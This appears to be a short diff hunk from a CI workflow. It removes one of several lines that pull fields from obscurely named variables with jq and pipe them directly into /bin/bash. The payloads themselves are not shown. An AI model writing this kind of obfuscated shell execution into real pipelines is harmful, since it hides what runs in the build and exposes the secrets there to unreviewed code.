@@ -31,7 +31,6 @@ jobs:
           echo $plnk4 | jq -r .krose28 | /bin/bash
           echo $tlmbd8676 | jq -r .rhgyc91 | /bin/bash
           printf '%s' "$shdr26" | jq -r .m4184 | /bin/bash
-          echo $wws94599 | jq -r .chvk3272 | /bin/bash
           echo $v67571 | jq -r .y8001 | /bin/bash
 
       - name: Persist output
